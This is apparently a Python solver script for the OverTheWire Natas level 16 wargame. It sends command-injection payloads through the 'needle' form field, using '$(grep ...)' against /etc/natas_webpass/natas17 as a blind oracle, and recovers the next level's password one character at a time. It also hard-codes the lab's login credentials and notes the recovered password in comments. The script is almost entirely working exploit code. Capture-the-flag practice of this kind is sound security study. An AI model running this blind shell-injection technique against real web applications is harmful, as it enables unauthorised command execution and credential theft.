import requests
import string

PASS_LEN=32

basicAuth=requests.auth.HTTPBasicAuth('natas16','hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

u="http://natas16.natas.labs.overthewire.org/"

check_word="mosque"

CHARS=string.ascii_letters+string.digits
char_pos=0

valid_chars=""

#Find all valid characters of the true password
while char_pos<len(CHARS):
    payload={
        'needle':f"$(grep {CHARS[char_pos]} /etc/natas_webpass/natas17){check_word}",
    }
    response=requests.post(u,data=payload,auth=basicAuth)

    if check_word not in response.text:
        valid_chars+=CHARS[char_pos]
        print(f"Found valid char: {valid_chars}")

    char_pos+=1

password=""

# valid_chars="bhjkoqsvwCEFHJLNOT05789"
# Find the order of the true password using the valid characters (only by appending)
while True:
    checked=0
    for char in valid_chars:
        payload={
            'needle':f"$(grep {password}{char} /etc/natas_webpass/natas17){check_word}",
        }
        response=requests.post(u,data=payload,auth=basicAuth)
        if check_word not in response.text:
            checked=1
            password+=char
            print(f"Password (append): {password}")
    if(not checked):
        break

# password="bo7LFNb8vwhHb9s75hokh5TF0OC"
# Find the order of the true password using the valid characters (only by prepending to the previously found order)
while True:
    checked=0
    for char in valid_chars:
        payload={
            'needle':f"$(grep {char}{password} /etc/natas_webpass/natas17){check_word}",
        }
        response=requests.post(u,data=payload,auth=basicAuth)
        if check_word not in response.text:
            checked=1
            password=char+password
            print(f"Password (prepend): {password}")
    if(not checked):
        break

#password="EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
print(f"Password: {password}")